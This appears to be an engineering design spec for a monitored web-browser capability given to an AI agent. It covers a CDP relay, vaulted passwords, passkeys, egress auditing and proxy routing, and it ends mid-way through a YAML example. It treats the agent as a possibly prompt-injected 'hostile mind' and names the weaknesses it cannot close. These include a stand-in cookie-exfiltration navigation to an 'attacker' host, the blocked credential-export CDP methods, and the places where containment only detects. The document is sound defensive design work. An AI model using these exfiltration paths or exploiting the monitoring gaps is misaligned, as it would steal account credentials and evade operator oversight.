# Spec 0004: The web door

Status: draft. Builds on spec 0001 (doors, the porch, the hostile-mind
doctrine), spec 0002 (per-agent bearers, the vault), and spec 0003 (the
umbilical, the ops gateway, per-wake sub-caps).

**Revision (post-MVP): the container egress FENCE is removed.** A
web-capable container launched with a deny-by-default `allowedHosts`
allowlist, but the fence never closed the real hole (a hijacked mind
exfiltrates through the REMOTE browser regardless, the irreducible
residual below), and it stopped the agent from the ordinary work of
looking things up and pulling packages. So it is burden without benefit.
Egress is now OBSERVE-ONLY: every outbound request the container makes
is intercepted, logged, and forwarded, for later analysis, and nothing
is blocked. The passages below that describe the fence as an active
boundary are superseded by this and section 8; they are kept for the
reasoning, not the mechanism.

## 1. The problem

The mind's "browsing" today is WebFetch and curl: plain HTTP, no
JavaScript, no forms, no logins, no cookies. An agent that earns its
keep on the open web needs a real browser: to create accounts on web
apps (it already receives email, so verification flows close), to sign
in and stay signed in across wakes, to operate dashboards that are
JavaScript all the way down, and to test the sites it publishes.

A browser is also the sharpest tool this system will hand a hostile
mind. It carries logged-in sessions (ambient authority on third-party
sites), it renders attacker-controlled content next to those sessions
(prompt injection with hands), and browser state is a bag of secrets
that must never touch a repo. So the browser is a DOOR, with the same
posture as money and mail: credentials only in Workers, deterministic
policy, everything ledgered, and the operator able to watch.

## 2. Decisions

- **Remote browser for identity.** Every browser session that holds a
  login is a Cloudflare Browser Run session, reached through the
  gateway below: credentials never enter the container. Since §9 the
  container also carries a local Chrome for UNAUTHENTICATED browsing
  through the session's own egress; it holds no identity and keeps
  nothing between wakes, so it weakens none of this, and it is also
  how a dev server is checked (section 7, on loopback). Two browsers,
  one rule: identity only ever lives in the remote one.
- **CDP is the protocol, the relay is a POLICY POINT.** Browser Run
  exposes a raw Chrome DevTools Protocol WebSocket; every client
  (Playwright, Puppeteer, chrome-devtools-mcp, Stagehand) speaks it,
  and switching providers later is a URL change. But a raw CDP pipe is
  an exfiltration door: `Network.getAllCookies`, `Storage.getCookies`,
  `WebAuthn.getCredentials`, and `Runtime.evaluate("document.cookie")`
  would hand the mind the very session credentials this door protects,
  past every content sweep. So the relay is NOT transparent (section 5,
  "the relay is where policy lives"): it drops credential-export
  methods, owns WebAuthn, and substitutes secrets on injection.
- **MCP is the mind-side surface.** The harness gets a standard browser
  MCP server (chrome-devtools-mcp) pointed at the relay; no bespoke
  browsing tools. Codex and Grok speak MCP too, so the door is
  harness-portable by construction. Scripts are equally welcome: anything in the
  container may connectOverCDP to the same relay endpoint.
- **Named sessions, persisted by the Gatekeeper.** Browser Run sessions
  die (10 minutes idle, max); identity must not. The Gatekeeper
  snapshots storage state (cookies + localStorage + a name) into its
  own Durable Object storage and restores it into the next Browser Run
  session. Never the repo: repo history is forever and cookies are
  credentials.

## 3. The browser Gatekeeper (browser-gk)

One new Worker, one Durable Object class (`WebSession`), one DO
instance per (agent, session name). It is the only holder of the
Cloudflare API token that reaches Browser Run.

Each `WebSession` DO:

- **Opens**: dials `wss://api.cloudflare.com/.../browser-rendering/
  devtools/browser?keep_alive=600000&recording=true` with the
  Worker-held API token and restores the saved storage state (CDP
  `Storage.setCookies` + an init script for localStorage). The values
  stay in browser-gk and Browser Run and never enter the container, so
  door-egress of an extracted value is bounded by where doors go
  (section 5, layer two). Container egress is AUDITED, not fenced
  (section 8, revision note): the browser is the real exfil path, so a
  fence bought nothing. The web door is wired (the BROWSER binding, the
  `web` option) only for web-capable agents.
- **Relays**: pipes CDP frames both ways between the container side and
  Browser Run. The relay is transparent to clients and is where all
  policy lives.
- **Ledgers**: `web_session_open` / `web_session_close`, every
  top-frame navigation (`Page.frameNavigated`), and downloads. The
  ledger is the greppable audit trail; the Browser Run recording
  (`recording=true`) is the full-fidelity replay, viewable in the
  Cloudflare dashboard after the session closes.
- **Snapshots**: on close, wake end, or relay disconnect, exports
  storage state into DO storage under the session name. Open after
  close resumes the same identity.
- **Enforces** (section 5): the per-wake concurrency cap, the optional
  aggregate browser-minute cap when enabled, the origin denylist, and
  the CDP input sweep.

### Provider configuration

The upstream CDP provider is configuration, not code (browser-gk
`provider.ts`): Cloudflare Browser Run is the default, and any other
CDP endpoint plugs in through `WEB_CDP_ENDPOINT` (a `wss://` or
`https://` URL) with an optional `WEB_CDP_TOKEN` bearer. An endpoint
may instead carry its credentials as URL userinfo
(`wss://user:pass@host`); browser-gk moves them into the dial's
`Authorization: Basic` header and strips them from the URL, so no
logged or ledgered URL ever holds them. An endpoint with userinfo AND
a bearer is refused by name (`web_cdp_auth_ambiguous`) rather than
resolved by guess. Everything behind the dial (relay, policy,
identity persistence, metering, screenshots) is provider-neutral CDP;
only the vendor live-view command is gated on the provider name.

### Session naming

Sessions are named by purpose (`x-account`, `github`, `research`), not
per wake. `operon web open <name>` either resumes the saved state under
that name or starts clean. Names are per-agent; two agents can both
have a `github` session with disjoint state. An unnamed quick session
(`operon web open`) gets a wake-scoped name and is never persisted.

## 4. The path: everything through the gateway

```
mind (MCP client or script)
  -> ws://127.0.0.1:<porch>/web/<name>     x-operon-porch header (CSRF fence)
  -> porch (root) relays, adding the per-wake nonce
  -> http://web.operon.internal/<name>      nonce as bearer
  -> umbilical router (WakeContainer)       nonce validated, agent id asserted
  -> browser-gk service binding             real bearer attached
  -> WebSession DO                          policy + ledger + snapshot
  -> wss://api.cloudflare.com/...           Cloudflare API token (Worker-held)
```

The container holds no browser credential of any kind, consistent with
spec 0003 section 4. The porch hop exists because door tokens are held
by the ROOT entrypoint, never the session env (spec 0003 section 5):
the mind cannot skip the porch, and the porch's CSRF header kills
browser-page-origin calls. The relay is a WebSocket end to end; the
porch and umbilical currently speak request/response only, so both grow
a ws-passthrough (the porch already terminates loopback HTTP; a ws
upgrade is an HTTP request).

Risks to spike FIRST: there are TWO undocumented WebSocket links, not
one, and the fallback only covers the first.
1. Container -> umbilical: the ws upgrade through the container
   outbound interception path (`interceptOutboundHttp`). Fallback if it
   does not relay: the porch dials browser-gk's public hostname with a
   root-held door bearer (the pre-umbilical pattern, credential-free
   for the mind). But this fallback REINTRODUCES a container-root door
   token for the life of the feature, so it is a real regression, not a
   free escape hatch, and the spike must report which path it is on.
2. Umbilical -> browser-gk: a ws upgrade over a SERVICE BINDING. If a
   binding does not carry an upgrade, browser-gk needs a public
   hostname reached with the root bearer, which collapses into the same
   regression as (1). The spike must prove this hop too.

Reconnect and keepalive are part of an implementable "session may live
the whole wake". `keep_alive=600000` is an IDLE window, not a lifetime:
Browser Run has no max active lifetime but closes after 10 idle minutes
and on platform releases. So the relay sends a cheap CDP heartbeat
(e.g. `Browser.getVersion`) on an interval inside that window,
snapshots on any drop, and the client reopens transparently. And
`WebSession` itself needs the keepalive `WakeContainer` already uses
(operon#3): a DO that only pipes a socket is otherwise evicted
mid-relay.

## 5. The hostile-mind boundary

The browser inherits spec 0003 section 5's premise: the mind is
assumed steerable by content it reads, and a browser feeds it
attacker-controlled content while holding the agent's logged-in
sessions. The door defends itself:

### The relay is not transparent (credentials do not leave over CDP)

A logged-in session's cookies and passkeys are the credential; the
whole door is pointless if the mind can read them out over CDP and
carry them off. Two layers:

- **Method drop (layer one)**: on the client->upstream direction the
  relay refuses `Network.getCookies`, `Network.getAllCookies`,
  `Storage.getCookies`, `Storage.getStorageKeyForFrame`, and every
  `WebAuthn.*` method, answering the client with a CDP error so its
  request settles. WebAuthn is OWNED by the relay (the virtual
  authenticator, section on passkeys), exactly as the Cloudflare API
  token is; the mind never touches it. This is clean and has no false
  positives.
- **Door egress of an extracted value (layer two)**: `Runtime.evaluate`
  and `Runtime.callFunctionOn` are dual-use (chrome-devtools-mcp needs
  them), so they cannot be dropped, and `document.cookie` / localStorage
  are reachable through them. The wake denylist is NOT the answer here:
  it is a container-local array and browser-gk is a remote Worker with
  no path to it, and the only way to make one would be to ship the
  cookie VALUES into the container, which is the leak. So the container
  never learns the cookie value, and the containment for the value the
  mind DID extract is where the doors GO, not a value sweep:
  - Direct egress is AUDITED, not blocked (section 8): the fence was
    removed (see the revision note at the top), so an extracted value
    can leave the container over ordinary egress, and the record is the
    containment, not prevention. This is deliberate: the remote browser
    is an open exfil path anyway (the irreducible residual below), so
    blocking direct egress bought nothing and cost the agent its normal
    lookups and installs.
  - `notify` lands in front of the OPERATOR; `email` is held and
    swept; `PR` targets an allowlisted repo under operator review; so a
    credential shoved through one of those reaches the operator or a
    reviewed surface, not an attacker.
  - `publish` is the one door with a public destination (the agent's
    own host), so published bytes keep their existing gitleaks +
    denylist sweep, which catches token-SHAPED secrets. A session
    cookie that matches no pattern is the residual, bounded by the
    session recording, the navigation ledger, and the agent's own site
    being monitored. If that residual is judged too sharp for a tenant,
    the deployment can gate `publish` closed while a web session is
    open; that is a policy knob, not a default.

### The remote browser is itself an open-web egress path (irreducible)

The door bounds above are about the CONTAINER. The browser is remote
and on the open web BY DESIGN, so a mind that has read a cookie via
`Runtime.evaluate` can make the BROWSER carry it out:
`Page.navigate("https://attacker/?c=<cookie>")`, or a `fetch()` inside
an `evaluate`. Nothing on the container side sees this; it is Browser
Run's own egress. This is the very reason the container fence was not
worth keeping: the exfil path it left open is the dominant one. This is the confused-deputy limit restated (spec 0003
section 5): a hostile mind wielding the agent's own legitimate browser
cannot be stopped by a network boundary, only bounded and observed. The
layers, honestly labelled as bound-and-detect, not prevent:
- **Bulk export is blocked**: the credential-export CDP methods are
  dropped, so the mind cannot dump the whole cookie jar or the passkeys
  in one call; it is reduced to whatever a single `evaluate` reads.
- **Scoped sessions are fenced at the platform** (this is about the
  REMOTE browser, not the container): a session whose work is one site
  (`x-account`, `github`) is opened with Browser Run `allowedDomainSets`
  pinned to that site's domains, so the remote browser itself cannot
  reach an attacker origin. Only an open-ended `research` session is
  unpinned, and that is the case the next layers cover. This is the one
  place a domain allowlist still earns its keep, because it fences the
  browser (the exfil path), not the container (which never was).
- **The relay checks navigation**: `Page.navigate` targets are matched
  against the origin denylist; a deployment that wants to harden an
  open-ended session can run it denylist-heavy or, in the extreme,
  allowlist-only.
- **Detection, not prevention, for the rest**: the session recording,
  the navigation ledger, the per-wake caps, and delete-session are the
  containment for the residual exactly as they are everywhere the
  hostile-mind doctrine applies. The web door does not claim to prevent
  a steered mind from misusing a session it legitimately holds; no door
  does.

- **Session lifetime and concurrency.** A session may live for the
  WHOLE wake: some work needs a browser open end to end, and the wake
  hard wall is the natural time bound (every session closes and
  snapshots at wake end regardless). The cap that matters is
  CONCURRENCY: at most 3 sessions open at once per wake (env knob;
  one open session is the norm and the doctrine). One `WebMeter` DO
  per agent enforces it, aggregated across named and unnamed sessions
  via short leases keyed by wakeId, so N sessions never dodge the
  limit; it also totals browser-minutes per wake into the ledger for
  observability and cost tracking. The aggregate browser-minutes knob
  is a hard money bound (section 9): DEFAULT ON at 20-30 min/wake for
  the first tenant, looser or off only where an operator has watched
  the ledger and chosen to. The wake wall is the backstop behind it;
  the next wake starts with a clean context either way.
- **Origin blocklist** (the manifest's `egress.blocklist`, spec 0006
  §2, default empty), ONE list enforced in THREE places: the relay
  refuses to forward a `Page.navigate` to a denied origin, the Browser
  Run session is opened with `allowedDomainSets` guardrails (a
  platform-level layer under the relay), so a denied origin is
  unreachable even if a relay bug lets a navigation slip, and the
  container's egress forwarder (section 8) refuses it for the
  session's plain HTTP. The fleet renders it to the browser Gatekeeper
  (`WEB_ORIGIN_DENYLIST`) and to the scheduler (`EGRESS_BLOCKLIST`)
  from the one block, so the two cannot drift. The list is deployment
  policy, like every cap. An allowlist is deliberately NOT the default:
  the whole point of the door is the open web.
- **CDP input sweep**: `Input.insertText`, `Input.dispatchKeyEvent`
  batches and `Runtime.evaluate` payloads are swept against the secret
  denylist (the gitleaks doctrine, applied to keystrokes) before
  relaying. A mind cannot type the mind credential, a door bearer, or
  a vaulted secret it read into a web form the sweep can see.
- **Sessions are ambient authority.** A logged-in `x-account` session
  can do whatever that account can do, steered or not. Containment is
  the same as every outward door: caps, ledger, recording, live view,
  and the operator's standing ability to delete a session's state
  (which is a logout everywhere it was signed in).
- **No cross-agent reach**: session state is keyed by (agent, name)
  and the umbilical asserts the agent id; agent A cannot open agent
  B's sessions.

### Passwords: placeholder in, injection at the relay

The sweep above forbids typing secret VALUES, which raises the obvious
question: how does the agent enter the password for an account it
created? Answer: it never has the password, in either direction, the
same pattern as the phase-2 mind-credential injection.

- **Mint**: `operon web password <origin>` generates a strong password
  DOOR-SIDE, stores it in the vault under `web/<origin>`, and returns
  only a placeholder token. The mind never sees the value, not even at
  signup, so it cannot leak what it does not hold.
- **Fill**: the mind types the placeholder
  (`{{vault:web/<name>}}`) into the field. The RELAY substitutes the
  real value, but only on a domain the credential is BOUND to.
  Substitution runs on EVERY CDP path that can put text into the page,
  not just `Input.insertText`: `Input.dispatchKeyEvent`,
  `Runtime.evaluate`, `Runtime.callFunctionOn`, and clipboard
  (`Input.dispatchKeyEvent` paste), because Playwright- and
  chrome-devtools-mcp-style `fill` usually goes through
  `element.value = ...` in an evaluate, not synthetic keystrokes.
  Sweep-without-substitute on one path would submit the literal
  placeholder.

  The credential is always injected as DATA, never spliced into
  JavaScript SOURCE. A password holds `'`, `"`, `\`, `${`, newlines;
  concatenating it into an expression string would both corrupt an
  ordinary fill and open a code-injection path. So: on the keystroke
  paths (`insertText`, `dispatchKeyEvent`) the value is already data.
  On `Runtime.callFunctionOn` the relay substitutes an ARGUMENT value
  (a data param in the `arguments` array), never the `functionDeclaration`
  body. A placeholder found INSIDE a raw `Runtime.evaluate` expression
  string is REFUSED, since there is no safe splice of arbitrary data
  into code; the relay's error tells the client to pass the field's
  value through an argument-carrying path (`callFunctionOn` arguments or
  a bound-function fill) instead. The placeholder token itself is chosen
  from a syntax-inert alphabet so it never needs escaping to detect.

  The origin checked is the TARGET EXECUTION CONTEXT's origin, never
  the top-level page's. A `Runtime.evaluate`/`callFunctionOn` carries
  an `executionContextId` (or an `objectId`) that can point at a
  cross-origin iframe: a page from a bound domain can embed an
  attacker's frame, and substituting against the top-level origin would
  inject the real password into the attacker's document. So the relay
  binds against the origin of the exact EXECUTION CONTEXT the fill runs
  in, which it obtains by evaluating `location.origin` IN THAT CONTEXT:
  for an `executionContextId` via `Runtime.evaluate({expression:
  "location.origin", contextId})`, and for an `objectId` via
  `Runtime.callFunctionOn({objectId, functionDeclaration: "function(){
  return location.origin }", returnByValue:true})`, which executes in
  the object's OWN context and so needs no assumption about `this`.
  Neither the session/target origin nor a `this.ownerDocument` probe is
  used: the session is too coarse (site isolation is per-SITE, so a
  same-site cross-origin subframe shares its parent's target) and
  `this` is wrong (a locator fill's `callFunctionOn` runs on a utility
  object with the element as an argument). Running `location.origin` in
  the target context is precise for both. Substitution is REFUSED
  unless that origin is on the bound domain. Anywhere off a bound domain
  the placeholder goes through verbatim: a steered mind cannot be
  phished into entering the GitHub password on a lookalike domain, or
  a bound page's hostile subframe, because the mind does not have it.

### Domain binding (auth hosts are rarely the main host)

Real sign-up and sign-in flows hop hosts: `accounts.google.com` for a
Google product, an Auth0/Okta tenant domain, `id.atlassian.com`, a
`signup.` host distinct from the login host, SSO redirect chains. So
binding is not exact-origin:

- **Registrable domain (eTLD+1) matching**, via the public suffix
  list: `signup.example.com`, `auth.example.com` and `example.com` are
  one binding.
- **Bound by observation, not declaration**: a credential's domain set
  is SEEDED by where the relay actually performed the substitution
  during signup. The relay is present for the whole flow, so a
  password form living on `auth.vendor-idp.com` while the app is
  `app.example.com` binds both, automatically and correctly, with the
  navigation chain ledgered.
- **Automatic seeding is safe because passwords are unique per
  credential**: if the mind is steered into "signing up" on a phishing
  site, the attacker captures a fresh random password to an account
  that exists nowhere else. The dangerous case is an EXISTING
  credential on a NEW domain, and that is exactly what seeding never
  allows.
- **Extending a binding is a held decision**: an existing credential
  filled on an unbound domain (a site migrating auth hosts, or an
  actual phish) is refused at the relay and surfaced to the operator
  through the same notify-with-buttons machinery as email and spend
  holds; approval adds the domain, audited. Rare by construction, so
  the friction lands only where the risk is.
- This keeps the input sweep absolute: there is never a legitimate
  reason for a real secret value in a keystroke. In practice the
  persisted session cookie does most logins and passwords are rare.

The browser session cookie AND the vaulted password together are the
account; deleting both is account abandonment.

### Passkeys first (WebAuthn at the relay)

Passkeys are the PREFERRED credential wherever a site offers them, and
the fit is exact: CDP has a native WebAuthn domain, so the relay
installs a VIRTUAL AUTHENTICATOR into every session
(`WebAuthn.addVirtualAuthenticator`, CTAP2/internal,
automatic presence + user-verified).

- **Registration**: the site prompts for a passkey, the virtual
  authenticator answers, and the relay exports the resulting
  credential (`WebAuthn.getCredentials`) into the session's DO storage
  keyed by rpId, beside the cookies it already keeps. On the next
  session open the relay restores it (`WebAuthn.addCredential`).
- **Sign-in is a click.** No secret is typed, no placeholder, no
  sweep interaction, no OTP dance.
- **Origin binding is cryptographic**, enforced by the protocol
  itself: an assertion is scoped to the rpId, so a lookalike domain
  cannot use the credential at all. Everything the password machinery
  above approximates with domain binding and held decisions, WebAuthn
  provides natively; none of it is needed on the passkey path.
- The mind never holds any part of the credential at any point,
  including enrollment. Doctrine: when a signup or account-settings
  page offers a passkey, take it; passwords are the fallback for sites
  without one.

### OTPs

- **Email codes and magic links** work TODAY: the agent's inbox is the
  email door (`operon email pull`). Codes are short-lived and
  single-use, so reading one from the inbox and typing it is safe; the
  sweep does not apply to ephemeral values.
- **TOTP** (authenticator-app codes): the seed is vaulted at
  enrollment (`operon vault set web-totp/<name>`, through the porch,
  never keystrokes) and codes are minted door-side: `operon web otp
  <name>` returns the current 6-digit code, which is safe to type for
  the same reason email codes are. The seed does transit the session
  once at enrollment (the site displays it); the sweep denylists it
  from that moment, and relay-side DOM extraction is a later
  tightening if that window matters.
- **SMS**: the agent has no phone number. Out of scope for this spec;
  a number-renting door would be its own decision with its own abuse
  surface.

## 6. Operator surface

Through the ops gateway (spec 0003 section 3), new routes:

- `GET /web/sessions`: per agent, the named sessions: name, cookie
  DOMAINS (where it is logged in; never values), created, last used,
  live or saved, minutes used this wake.
- `GET /web/sessions/:name/history`: the navigation ledger for one
  session.
- `POST /web/sessions/:name/delete` (decision, audited): the remote
  logout button. Deletion is three steps in one action, in order:
  terminate any LIVE Browser Run session under the name (close the
  upstream, drop the relay), bump the session's GENERATION counter,
  then drop the saved state. Every snapshot write carries the
  generation it started from and the DO refuses stale ones, so an
  in-flight snapshot-on-close from the killed session cannot write
  the deleted cookies back under the same name. Delete means gone.
- Downloads and uploads are content boundaries. A downloaded file that
  reaches the container is inbound untrusted content (the email/#24
  class): the relay keeps downloads WORKER-side (ledgered, offered to
  the mind only through a door that scans them), never landing raw in
  the container. Uploads (`Page.setFileInputFiles`) can push repo bytes
  into a logged-in third-party origin, so an upload is swept exactly
  like a publish/PR payload (denylist + gitleaks) before it leaves.
- Live sessions: the response includes the Browser Run live-view URL
  (`Cloudflare.getLiveView`), which is watch-and-intervene: the
  operator can see the page the agent sees and take the wheel.
- A recording is rrweb event JSON (DOM mutations, input events,
  navigations), not video and not raw CDP frames; input field content
  is masked by default. Cloudflare retains recordings for only 30 DAYS
  (2-hour cap per session) then deletes them, which is why "never
  deleted" (section 3) requires us to keep our own copy: browser-gk
  FETCHES each recording as JSON on session close (with retry, since a
  recording exists only after close) and ARCHIVES it to R2. The
  Cloudflare dashboard (Browser Run > Runs) is the convenient 30-day
  viewer; the R2 copy plus the ledger is the permanent trail. This is
  MVP, not optional: without it "recordings are never deleted" is
  false, since Cloudflare deletes them.

## 7. Local testing: the local browser, on loopback

Agents build sites and need to see them rendered. The local browser
(§9) reaches the container's own dev server directly: loopback is
always direct for the forwarder and bypassed by Chrome's proxy rules,
so `http://127.0.0.1:<port>` renders in the wake's own Chrome with no
tunnel, no exposure, and no identity. What the world will see is what
the published site shows, checked the same way once `operon publish`
has run.

Earlier drafts of this spec planned a short-lived Cloudflare quick
tunnel (`operon web expose`, a `cloudflared` binary in the image) so
the REMOTE browser could reach the dev server. That path was never
built and is retired: it exposed a container port to anyone holding a
random URL, needed a tunnel client in the image, and only ever
existed because the container had no browser of its own. A dev server
that must be seen by a logged-in user is a published preview, not a
tunnel.

## 8. Egress audit: every request the container makes

Today only DOOR traffic passes through the supervisor; npm, git, curl
and WebFetch leave the container directly and unobserved. The same
interception machinery closes that gap:

- `interceptAllOutboundHttp` routes EVERY outbound HTTP request
  through a chassis handler; `interceptOutboundHttps("*")` does the
  same for TLS once the image trusts the Cloudflare containers CA,
  which is the identical CA-trust step the phase-2 mind-credential
  injection already requires. One piece of machinery, two consumers.
- The interceptor is a loopback `EgressAudit` WorkerEntrypoint on the
  `WakeContainer` (via `ctx.exports`, delivering agent + wake id as
  `ctx.props`), pointed at by `interceptOutboundHttps("*")`. It runs in
  the Workers runtime OUTSIDE the container, so the log is unforgeable
  by the container. HTTPS interception needs the container to trust the
  platform's per-instance CA (placed at `/etc/cloudflare/certs`); the
  entrypoint trusts it at startup (system store for curl/git,
  `NODE_EXTRA_CA_CERTS` for node), the same CA-trust the phase-2
  mind-credential injection also needs.
- Each request logs one compact JSON line (`method`, `host`, `path`,
  query LENGTH only since a query string can carry secrets, `status`,
  agent + wake id) via `console`, which Workers observability captures
  and makes queryable. Volume is high (an npm install is thousands of
  requests), which is why the line is compact and the sink is
  observability rather than a DO; batched R2 JSONL for longer retention
  is a later add.
- OBSERVE-ONLY, and FAIL-OPEN: the interceptor logs and forwards, and a
  logging failure never blocks the request. Nothing is blocked, because
  (revision note, top) the fence was removed: the browser is the real
  exfil path, so blocking direct egress was burden without benefit. An
  allow/deny egress POLICY remains a possible future knob, deliberately
  separate from the audit.

### Outbound proxy (optional)

A deployment may route the mind session's plain HTTP egress through
upstream HTTP proxies. The policy is the manifest's `egress:` block
(spec 0006 §2): `proxies` DEFINES each upstream once, by name, with
its address and the NAME of its credential secret; `proxy` maps
destination hosts to a proxy name or `direct`; the templates render
both as the scheduler's `EGRESS_PROXY` var. **An address never
carries a credential value**, because the manifest is committed
configuration, and the proxy's name travels to the container so
every audit line names which proxy carried a request:

```yaml
egress:
  proxies:
    general:
      address: http://general.proxy.example:7777
      credential: PROXY_GENERAL
    docs:
      address: http://other.proxy.example:8888
      credential: PROXY_DOCS
  proxy:
    "*": general
    docs.example: docs
    "*.registry.example": direct
```

(A key starting with `*` must be quoted, or YAML reads it as an
alias.)

A key is `*` (the catch-all), an exact hostname, or `*.domain` (the
domain and its subdomains); the most specific match wins (exact, then
the longest domain, then `*`), a value of `direct` means no proxy, and
a host no key matches goes direct. Unset, the table is
`{"*": "direct"}`, under which no forwarder runs and egress is exactly
as before.

A proxy's `credential: NAME` names the scheduler secret
`EGRESS_CREDENTIAL_<NAME>`, holding `user:pass` (the first colon
splits; any character is allowed, each half is percent-encoded into
the URL). A proxy without a `credential` is dialled unauthenticated.
One grammar (`@operon/core` `egress.ts`) serves three readers:

- The fleet validates the policy at manifest validation: a malformed
  name, pattern or address, or a route to an undefined proxy, fails
  by name, and a LITERAL credential in an address fails as
  `egress_policy_literal_credential`, pointing at the `credential:`
  form, so a pasted secret never reaches a commit. The secret
  checklist (spec 0006 §2) derives `EGRESS_CREDENTIAL_<NAME>` for
  every named credential, so bootstrap and `deploy --check` name
  exactly the secrets the policy needs.
- The scheduler substitutes at launch: the resolved policy (each
  proxy's address with its credential in, the routes as written)
  rides the wake env as `OPERON_EGRESS_PROXY`, and a named credential
  whose secret is not configured fails the launch as
  `egress_credential_missing`, like a missing mind credential.
- The container receives the resolved policy only, validates it again
  at wake start, and never sees a credential name.

No credential enters the session: the ROOT entrypoint runs a loopback
forwarder beside the porch for exactly the session's lifetime, decides
per host which upstream carries a request, attaches that upstream's
credential, and hands the session only the loopback address through
the standard variables (`HTTP_PROXY`, `HTTPS_PROXY`, `NO_PROXY`, plus
`NODE_USE_ENV_PROXY` so node clients honour them). curl, git, npm,
WebFetch and scripts route through it unchanged; the entrypoint's own
traffic (clone, doors, persist, notify) does not.

- **The chassis's own hosts are always direct, by derivation, not by
  listing.** Loopback (the porch), every host under the umbilical's
  suffix (`.operon.internal`, owned by `@operon/core` so the scheduler
  and the container cannot drift), every door URL in the wake config
  (found by the `Url` suffix, so a door added later is covered without
  anyone remembering), and every MCP virtual host. Since spec 0009 the
  container is handed no door URL outside the umbilical, so the suffix
  rule alone covers every door today; the URL derivation stays as the
  guard for any door that ever lives elsewhere. No table entry can
  send them through a proxy. They ride in `NO_PROXY` for clients that
  honour it, and the forwarder enforces the same rule for any client
  that does not.
- `CONNECT host:port` (every https URL) is tunnelled through the chosen
  upstream, or straight to the origin when direct, and the sockets
  spliced: TLS stays end to end between the session and the origin,
  and the forwarder sees hostnames only.
- Absolute-form `http://` requests are forwarded as they arrive.
- The forwarder logs one compact JSON line per tunnel or request in
  the platform audit's shape (`t: "egress"`, agent and wake ids,
  method, host, port; never a path or query) plus what the audit
  cannot see: `via: "forwarder"`, the `route` taken (`direct`,
  `proxy`, `blocked`, `refused`), the NAME of the proxy that carried
  it when proxied, and `status`, `reason` and the upstream's answer on
  a refusal. The line rides the wake transcript. It matters because
  the platform audit above sees only the connection TO the proxy host
  when a route is proxied (and nothing at all for a plain-http
  upstream, which its TLS interception does not cover): the
  destination and the route are recorded here and nowhere else.
- An upstream refusal (a 407, a non-200 CONNECT answer) is reported to
  the session as a 502 gateway failure, never relayed as a challenge:
  the session has no credential to offer and must not be invited to
  look for one.
- The harness's own API traffic rides the catch-all too unless a table
  entry routes its hosts elsewhere or direct.
- **The egress blocklist** (`egress.blocklist`, section 5) is refused
  here too: a listed host gets a 403 (`proxy_blocked_host`) on both
  paths, and the forwarder runs whenever the list is non-empty, proxy
  or no proxy. Chassis hosts are never blocked (blocking the porch
  would end the wake). This holds for every client that honours the
  proxy variables; the rest of container egress stays observe-only,
  as above, so the browser door is where the list is a hard fence.

The platform egress audit (above) still sees every connection the
forwarder makes; with a proxy configured, those connections address
the proxy hosts, and the forwarder's own log is where the destination
hosts are.

### Hosts worth keeping direct

A catch-all proxy carries everything the session fetches, and most of
a wake's bytes are not pages: they are package installs, git clones,
release downloads and the harness's own inference stream. None of
that gains anything from a proxy, and a metered upstream bills it all.
The table below is what a wake actually pulls, grouped by what
generates it, so a deployment can route it `direct` deliberately
rather than discover it on the invoice. Browser page traffic is out
of scope here: it leaves through the browser Gatekeeper and is billed
by the CDP provider regardless of this table.

| Source | Hosts | Notes |
|---|---|---|
| npm, npx, pnpm, yarn | `registry.npmjs.org`, `registry.yarnpkg.com`, `get.pnpm.io` | Metadata and tarballs both come from the registry; `npx` pulls the same way. |
| Native npm modules | `nodejs.org`, `github.com`, `objects.githubusercontent.com` | `node-gyp` fetches headers from nodejs.org; `prebuild-install` pulls binaries from GitHub releases. |
| Browser downloads via npm | `cdn.playwright.dev`, `playwright.azureedge.net`, `storage.googleapis.com`, `edgedl.me.gvt1.com` | Playwright and Puppeteer installs fetch a full Chromium, well over 100 MB each time. The image already carries Chrome for the local browser (§9) and a mind needs no second one, so these belong on the blocklist rather than a proxy. |
| pip, uv | `pypi.org`, `files.pythonhosted.org`, `bootstrap.pypa.io`, `astral.sh` | Index on pypi.org, wheels on pythonhosted. uv fetches its own binary and standalone Pythons from GitHub releases. |
| conda | `repo.anaconda.com`, `conda.anaconda.org` | Only if the agent installs it; large. |
| Go | `proxy.golang.org`, `sum.golang.org`, `storage.googleapis.com` | |
| Rust | `static.crates.io`, `index.crates.io`, `static.rust-lang.org` | Toolchain installs are hundreds of MB. |
| Ruby | `rubygems.org`, `index.rubygems.org` | |
| Debian | `deb.debian.org`, `security.debian.org` | The session runs unprivileged, so apt installs fail anyway. |
| Git and GitHub | `github.com`, `api.github.com`, `codeload.github.com`, `raw.githubusercontent.com`, `objects.githubusercontent.com`, `release-assets.githubusercontent.com`, `ghcr.io` | Clones, release downloads, raw file fetches, and `npm install github:owner/repo`. The state repo clone is entrypoint traffic and never passes the forwarder. |
| Claude Code | `api.anthropic.com`, `claude.ai`, `statsig.anthropic.com`, `code.claude.com` | Inference and the WebFetch domain preflight, the OAuth flow, feature flags, docs. Inference is the largest steady stream in any wake. |
| Codex | `api.openai.com`, `chatgpt.com`, `auth.openai.com`, `auth0.openai.com`, `platform.openai.com`, `developers.openai.com` | Inference with an API key (`api.`) or a ChatGPT subscription (`chatgpt.com`, a separate registrable domain); the device or browser OAuth flow and token refresh; docs. Updates and the native binary come from GitHub releases and npm, covered above. |
| Grok | `api.x.ai`, `auth.x.ai`, `accounts.x.ai`, `grok.com`, `cli-chat-proxy.grok.com` | Inference with an API key (`api.x.ai`) or a Grok subscription (cli-chat-proxy / grok.com); the device or browser OAuth flow and token refresh. Updates come from npm, covered above. |
| Model weights | `huggingface.co`, `cdn-lfs.huggingface.co`, `cdn-lfs-us-1.huggingface.co` | |
| Docker images | `registry-1.docker.io`, `auth.docker.io`, `production.cloudflare.docker.com` | No Docker in the container, but a pull attempt still costs the manifest fetch. |
| Cloudflare tooling | `api.cloudflare.com`, `workers.cloudflare.com` | `wrangler` runs. |
| Script CDNs | `cdn.jsdelivr.net`, `unpkg.com`, `esm.sh`, `cdnjs.cloudflare.com` | |
| Granted MCP servers | | Their virtual hosts are umbilical hosts, direct by derivation already. |

Claude Code and Codex honour `HTTPS_PROXY`, so without their entries the
inference stream rides the catch-all: the single most expensive thing
to proxy and the one with the least to gain from it. Grok does not
document the standard proxy variables; keep its hosts direct in any
case, and live-verify that the Rust client honours them.

As a policy, everything above stays off the proxy and the browser
downloads are blocked because the container can never use them:

```yaml
egress:
  proxies:
    general:
      address: http://general.proxy.example:7777
      credential: PROXY_GENERAL
  proxy:
    "*": general
    # package registries
    "*.npmjs.org": direct
    registry.yarnpkg.com: direct
    get.pnpm.io: direct
    nodejs.org: direct
    pypi.org: direct
    "*.pythonhosted.org": direct
    bootstrap.pypa.io: direct
